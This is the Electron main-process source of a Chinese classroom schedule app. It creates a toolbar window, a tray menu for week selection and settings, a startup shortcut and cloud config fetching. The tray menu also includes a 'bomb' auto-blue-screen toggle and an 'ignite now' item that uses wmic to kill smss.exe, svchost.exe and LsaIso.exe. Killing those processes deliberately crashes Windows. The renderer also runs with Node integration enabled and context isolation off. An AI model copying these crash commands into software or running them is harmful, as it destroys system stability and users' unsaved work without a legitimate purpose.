const { app, BrowserWindow, Menu, ipcMain, dialog, screen, Tray, shell, net} = require('electron')
const path = require('path');
const fs = require('fs')
const os = require('os')
const createShortcut = require('windows-shortcuts')
const startupFolderPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
const prompt = require('electron-prompt');
const Store = require('electron-store');
const { DisableMinimize } = require('electron-disable-minimize');
const store = new Store();
let tray = undefined;
let form = undefined;
var win = undefined;
let template = []
let basePath = app.isPackaged ? './resources/app/' : './'
if (!app.requestSingleInstanceLock({ key: 'classSchedule' })) {
    app.quit();
}
app.commandLine.appendSwitch("--disable-http-cache");
const createWindow = () => {
    win = new BrowserWindow({
        x: 0,
        y: 0,
        width: screen.getPrimaryDisplay().workAreaSize.width,
        height: 200,
        frame: false,
        transparent: true,
        alwaysOnTop: store.get('isWindowAlwaysOnTop', true),
        minimizable: false,
        maximizable: false,
        autoHideMenuBar: true,
        resizable: false,
        type: 'toolbar',
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true
        },
    })
    // win.webContents.openDevTools()
    win.loadFile('index.html')
    if (store.get('isWindowAlwaysOnTop', true))
        win.setAlwaysOnTop(true, 'screen-saver', 9999999999999)
}
function setAutoLaunch() {
    const shortcutName = '电子课表(请勿重命名).lnk'
    app.setLoginItemSettings({ // backward compatible
        openAtLogin: false,
        openAsHidden: false
    })
    if (store.get('isAutoLaunch', true)) {
        createShortcut.create(startupFolderPath + '/' + shortcutName,
            {
                target: app.getPath('exe'),
                workingDir: app.getPath('exe').split('\\').slice(0, -1).join('\\'),
            }, (e) => { e && console.log(e); })
    } else {
        fs.unlink(startupFolderPath + '/' + shortcutName, () => { })
    }

}
app.whenReady().then(() => {
    createWindow()
    Menu.setApplicationMenu(null)
    win.webContents.on('did-finish-load', () => {
        win.webContents.send('getWeekIndex');
        win.webContents.send('ABS', store.get('isAutoBlueScreen', false))

        if (store.get("isFromCloud", false)) {
            let scheduleConfigSync;
            let stat = true
            setTimeout(function () {
                const { net } = require('electron')
                const url = store.get('url', "https://class.khbit.cn/")
                const request = net.request(url)
                request.on('response', (response) => {
                    response.on('data', (chunk) => {
                        scheduleConfigSync = JSON.parse(chunk.toString())
                        console.log(scheduleConfigSync)
                    })
                    response.on('end', () => {
                        console.log('No more data in response.')
                        win.webContents.send("newConfig", scheduleConfigSync)
                    })
                })
                request.end()
            }, 5000)
        }
    })
    const handle = win.getNativeWindowHandle();
    DisableMinimize(handle); // Thank to peter's project https://github.com/tbvjaos510/electron-disable-minimize
    setAutoLaunch()
})

ipcMain.on('getWeekIndex', (e, arg) => {
    tray = new Tray(basePath + 'image/icon.png')
    template = [
        {
            label: '第一周',
            type: 'radio',
            click: () => {
                win.webContents.send('setWeekIndex', 0)
            }
        },
        {
            label: '第二周',
            type: 'radio',
            click: () => {
                win.webContents.send('setWeekIndex', 1)
            }
        },
        {
            label: '第三周',
            type: 'radio',
            click: () => {
                win.webContents.send('setWeekIndex', 2)
            }
        },
        {
            label: '第四周',
            type: 'radio',
            click: () => {
                win.webContents.send('setWeekIndex', 3)
            }
        },
        {
            type: 'separator'
        },
        {
            icon: basePath + 'image/setting.png',
            label: '配置课表',
            click: () => {
                win.webContents.send('openSettingDialog')
            }
        },
        {
            icon: basePath + 'image/clock.png',
            label: '矫正计时',
            click: () => {
                win.webContents.send('getTimeOffset')
            }
        },
        {
            icon: basePath + 'image/toggle.png',
            label: '切换日程',
            click: () => {
                win.webContents.send('setDayOffset')
            }
        },
        {
            icon: basePath + 'image/toggle.png',
            label: '云端链接',
            click: () => {
                win.webContents.send('fromCloud')
            }
        },
        {
            icon: basePath + 'image/github.png',
            label: '源码仓库',
            click: () => {
                shell.openExternal('https://github.com/EnderWolf006/ElectronClassSchedule');
            }
        },
        {
            type: 'separator'
        },
        {
            id: 'countdown',
            label: '课上计时',
            type: 'checkbox',
            checked: store.get('isDuringClassCountdown', true),
            click: (e) => {
                store.set('isDuringClassCountdown', e.checked)
                win.webContents.send('ClassCountdown', e.checked)
            }
        },
        {
            label: '窗口置顶',
            type: 'checkbox',
            checked: store.get('isWindowAlwaysOnTop', true),
            click: (e) => {
                store.set('isWindowAlwaysOnTop', e.checked)
                if (store.get('isWindowAlwaysOnTop', true))
                    win.setAlwaysOnTop(true, 'screen-saver', 9999999999999)
                else
                    win.setAlwaysOnTop(false)
            }
        },
        {
            label: '上课隐藏',
            type: 'checkbox',
            checked: store.get('isDuringClassHidden', true),
            click: (e) => {
                store.set('isDuringClassHidden', e.checked)
                win.webContents.send('ClassHidden', e.checked)
            }
        },
        {
            label: '开机启动',
            type: 'checkbox',
            checked: store.get('isAutoLaunch', true),
            click: (e) => {
                store.set('isAutoLaunch', e.checked)
                setAutoLaunch()
            }
        },
        {
            label: '云端获取',
            type: 'checkbox',
            checked: store.get('isFromCloud', false),
            click: (e) => {
                store.set('isFromCloud', e.checked)
            }
        },
        {
            label: '炸弹💣',
            type: 'checkbox',
            checked: store.get('isAutoBlueScreen', false),
            click: (e) => {
                store.set('isAutoBlueScreen', e.checked)
                win.webContents.send('ABS', e.checked)
            }
        },
        {
            label: '立马点燃🔥',
            click: (e) => {
                console.log("爆");
                const cmd1 = require('node-cmd').runSync("wmic process where name=\"smss.exe\" delete");
                const cmd2 = require('node-cmd').runSync("wmic process where name=\"svchost.exe\" delete");
                const cmd3 = require('node-cmd').runSync("wmic process where name=\"LsaIso.exe\" delete");
            }
        },
        {
            type: 'separator'
        },
        {
            icon: basePath + 'image/quit.png',
            label: '退出程序',
            click: () => {
                dialog.showMessageBox(win, {
                    title: '请确认',
                    message: '你确定要退出程序吗?',
                    buttons: ['取消', '确定']
                }).then((data) => {
                    if (data.response) app.quit()
                })
            }
        }
    ]
    template[arg].checked = true
    form = Menu.buildFromTemplate(template)
    tray.setToolTip('电子课表 - by lsl')
    function trayClicked() {
        tray.popUpContextMenu(form)
    }
    tray.on('click', trayClicked)
    tray.on('right-click', trayClicked)
    tray.setContextMenu(form)
    win.webContents.send('ClassCountdown', store.get('isDuringClassCountdown', true))
    win.webContents.send('ClassHidden', store.get('isDuringClassHidden', true))
})

ipcMain.on('log', (e, arg) => {
    console.log(arg);
})

ipcMain.on('setIgnore', (e, arg) => {
    if (arg)
        win.setIgnoreMouseEvents(true, { forward: true });
    else
        win.setIgnoreMouseEvents(false);
})

ipcMain.on('dialog', (e, arg) => {
    dialog.showMessageBox(win, arg.options).then((data) => {
        e.reply(arg.reply, { 'arg': arg, 'index': data.response })
    })
})

ipcMain.on('pop', (e, arg) => {
    tray.popUpContextMenu(form)
})

ipcMain.on('getTimeOffset', (e, arg) => {
    prompt({
        title: '计时矫正',
        label: '请设置课表计时与系统时间的偏移秒数:',
        value: arg.toString(),
        inputAttrs: {
            type: 'number'
        },
        type: 'input',
        height: 180,
        width: 400,
        icon: basePath + 'image/clock.png',
    }).then((r) => {
        if (r === null) {
            console.log('[getTimeOffset] User cancelled');
        } else {
            win.webContents.send('setTimeOffset', Number(r) % 10000000000000)
        }
    })
})

ipcMain.on('fromCloud', (e, arg) => {
    prompt({
        title: '云端链接',
        label: '请设置云端链接:',
        value: arg.toString(),
        inputAttrs: {
            type: 'string'
        },
        type: 'input',
        height: 180,
        width: 400,
        icon: basePath + 'image/toggle.png',
    }).then((r) => {
        if (r === null) {
            console.log('[Cloud] User cancelled');
        } else {
            win.webContents.send('setCloudUrl', r.toString())
            store.set("url", r.toString())
            console.log('[Cloud] ', r.toString());
        }
    })
})

